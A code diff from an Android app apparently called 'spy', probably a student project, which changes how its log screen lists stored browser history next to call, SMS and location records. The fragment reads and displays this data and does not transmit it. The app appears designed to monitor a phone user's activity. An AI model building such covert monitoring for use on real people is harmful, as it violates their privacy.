@@ -20,12 +20,14 @@ import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 
+import edu.uj.jkordas.spy.DAO.BrowserHistoryDataSource;
 import edu.uj.jkordas.spy.DAO.CallDataSource;
 import edu.uj.jkordas.spy.DAO.LocationDataSource;
 import edu.uj.jkordas.spy.DAO.SmsDataSource;
 import edu.uj.jkordas.spy.POJO.Call;
 import edu.uj.jkordas.spy.POJO.Location;
 import edu.uj.jkordas.spy.POJO.Sms;
+import edu.uj.jkordas.spy.POJO.VisitedPage;
 import edu.uj.jkordas.spy.R;
 
 
@@ -122,25 +124,18 @@ public class LogsActivity extends Activity {
 
 
     private void loadHistory(ArrayList<String> list) {
+        BrowserHistoryDataSource datasource = new BrowserHistoryDataSource(
+                getApplicationContext());
+        datasource.open();
 
-        String[] proj = new String[]{Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL};
-        String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history,
-        // // 1 =
-        // bookmark
-        Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
-        mCur.moveToFirst();
+        List<VisitedPage> visitedPageList = datasource.getAllVisitedPages();
+        Iterator<VisitedPage> it = visitedPageList.iterator();
 
-        if (mCur.moveToFirst() && mCur.getCount() > 0) {
-            boolean cont = true;
-            while (mCur.isAfterLast() == false && cont) {
-                String title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
-                String url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
-                mCur.moveToNext();
-
-                list.add(title + ": " + url);
-            }
+        while (it.hasNext()) {
+            VisitedPage visitedPage = it.next();
+            list.add(visitedPage.toString());
         }
-
+        datasource.close();
     }
 
     private void loadLocations(ArrayList<String> list) {
